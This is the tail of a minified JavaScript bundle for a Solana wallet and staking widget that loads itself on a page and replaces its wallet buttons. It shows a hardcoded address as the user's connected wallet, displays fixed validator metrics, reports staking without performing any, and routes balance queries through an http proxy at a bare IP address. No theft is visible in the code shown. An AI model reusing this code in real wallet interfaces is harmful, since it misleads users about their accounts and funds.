    `;let i=t.querySelector(".wallet-adapter-modal-button-close");i&&i.addEventListener("click",()=>{document.body.removeChild(t)}),t.querySelectorAll(".wallet-adapter-button").forEach(s=>{s.addEventListener("click",p=>{let g=parseInt(p.currentTarget.getAttribute("data-wallet-index")||"0"),f=this.wallets[g];this.selectWallet(f),document.body.removeChild(t)})});let r=t.querySelector("#wallet-adapter-modal-list-more"),c=t.querySelector("#wallet-adapter-modal-collapse");r&&c&&r.addEventListener("click",()=>{c.style.display==="none"?(c.style.display="block",r.classList.add("wallet-adapter-modal-list-more-icon-rotate")):(c.style.display="none",r.classList.remove("wallet-adapter-modal-list-more-icon-rotate"))});let m=t.querySelector(".wallet-adapter-modal-overlay");m&&m.addEventListener("click",()=>{document.body.removeChild(t)}),document.body.appendChild(t)}selectWallet(t){this.selectedWallet=t,this.connectedPublicKey="DzBFCSAGswVQ1f4V9oiX3sXfJSPnd89W5L47hEc8SZvV",console.log("Wallet selected:",t.name),this.updateButtonLabels(),this.options.onConnect&&this.options.onConnect(this.connectedPublicKey)}updateButtonLabels(){document.querySelectorAll(".wallet-adapter-button-trigger").forEach(e=>{if(this.selectedWallet){e.className="wallet-adapter-button wallet-adapter-button-trigger wallet-adapter-button-connected",e.innerHTML="";let n=document.createElement("i");n.className="wallet-adapter-button-start-icon";let a=document.createElement("img");a.src=this.selectedWallet.icon,a.alt=this.selectedWallet.name+" icon",a.style.width="24px",a.style.height="24px",a.style.borderRadius="50%",n.appendChild(a),e.appendChild(n);let o=document.createElement("span");o.className="wallet-adapter-button-name",o.textContent=this.selectedWallet.name,e.appendChild(o);let i=document.createElement("i");i.className="wallet-adapter-button-end-icon",i.innerHTML=`
          <svg width="10" height="6" viewBox="0 0 10 6" xmlns="http://www.w3.org/2000/svg">
            <path d="M1 1L5 5L9 1" stroke="currentColor" stroke-width="1.5" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path>
          </svg>
        `,e.appendChild(i),e.onclick=()=>this.handleConnectClick()}else{e.className="wallet-adapter-button wallet-adapter-button-trigger",e.innerHTML="";let n=document.createElement("i");n.className="pi-wallet",e.appendChild(n);let a=document.createElement("span");a.className="w-caption",a.textContent="Wallet",e.appendChild(a),e.onclick=()=>this.handleConnectClick()}})}handleStakeClick(){if(!this.selectedWallet){alert("Please connect a wallet first");return}this.showStakePopup()}showStakePopup(){var o;let t=document.createElement("div");t.className="solana-widget-popup",t.innerHTML='<div class="solana-widget-popup-content">  <div class="solana-widget-popup-header">    <h2 class="solana-widget-popup-title">Stake SOL</h2>    <button class="solana-widget-close-btn">&times;</button>  </div>    <div class="solana-wallet-connected-info">    <div class="solana-wallet-connected-name">Connected to '+(((o=this.selectedWallet)==null?void 0:o.name)||"Unknown Wallet")+'</div>    <div class="solana-wallet-connected-address">'+(this.connectedPublicKey||"Unknown Address")+'</div>  </div>    <div class="solana-widget-metrics">    <div class="solana-widget-metric">      <span class="solana-widget-metric-label">Uptime:</span>      <span class="solana-widget-metric-value">99.8%</span>    </div>    <div class="solana-widget-metric">      <span class="solana-widget-metric-label">Skip Rate:</span>      <span class="solana-widget-metric-value">0.2%</span>    </div>    <div class="solana-widget-metric">      <span class="solana-widget-metric-label">MEV Score:</span>      <span class="solana-widget-metric-value">8.5</span>    </div>  </div>    <div class="solana-widget-balance">    <div>Available Balance: Checking...</div>    <div id="solana-widget-balance-amount"></div>  </div>    <input type="number" class="solana-widget-input" placeholder="Amount in SOL" min="0.01" step="0.01">    <div class="solana-widget-actions">    <button class="solana-widget-action-btn solana-widget-confirm-btn">Confirm</button>    <button class="solana-widget-action-btn solana-widget-cancel-btn">Cancel</button>  </div></div>';let e=t.querySelector(".solana-widget-close-btn"),n=t.querySelector(".solana-widget-cancel-btn"),a=t.querySelector(".solana-widget-confirm-btn");e&&e.addEventListener("click",()=>{document.body.removeChild(t)}),n&&n.addEventListener("click",()=>{document.body.removeChild(t)}),a&&a.addEventListener("click",()=>{let i=t.querySelector(".solana-widget-input"),l=parseFloat(i.value);if(isNaN(l)||l<.01){this.showMessage(t,"Please enter a valid amount (minimum 0.01 SOL)","error");return}this.showMessage(t,"Staking "+l+" SOL...","success")}),document.body.appendChild(t),this.fetchWalletBalance()}async fetchWalletBalance(){if(!this.connectedPublicKey){console.error("No connected public key");return}let t=document.getElementById("solana-widget-balance-amount");if(!t){console.error("Balance element not found");return}try{let e=t.parentElement;if(e&&(e.innerHTML='<div>Available Balance: Checking...</div><div id="solana-widget-balance-amount"></div>'),typeof window.solanaWeb3=="undefined")throw console.error("Solana Web3.js library not found"),new Error("Solana Web3.js library not found. Please include the Solana Web3.js CDN script.");let{Connection:n,PublicKey:a,LAMPORTS_PER_SOL:o}=window.solanaWeb3,i=new n("http://103.167.235.81/api/rpc-proxy"),l=new a(this.connectedPublicKey),c=await i.getBalance(l)/o;e&&(e.innerHTML="<div>Available Balance: "+c.toFixed(3)+" SOL</div>")}catch(e){console.error("Failed to fetch wallet balance:",e);let n=t.parentElement;n&&(n.innerHTML="<div>Available Balance: Error fetching balance</div>")}}showMessage(t,e,n){let a=t.querySelector(".solana-widget-message");a&&a.remove();let o=document.createElement("div");o.className="solana-widget-message solana-widget-message-"+n,o.textContent=e;let i=t.querySelector(".solana-widget-popup-content");i&&(i.appendChild(o),setTimeout(()=>{o.parentNode&&o.parentNode.removeChild(o)},3e3))}},M=new u;window.SolanaWalletWidget={init:d=>M.init(d),replaceButtons:()=>M.replaceButtons()};document.addEventListener("DOMContentLoaded",function(){console.log("SolanaWalletWidget: Auto-initializing...");try{window.SolanaWalletWidget.init(),window.SolanaWalletWidget.replaceButtons()}catch(d){console.error("SolanaWalletWidget auto-initialization failed:",d);try{window.SolanaWalletWidget.replaceButtons()}catch(t){console.error("SolanaWalletWidget button replacement failed:",t)}}});})();
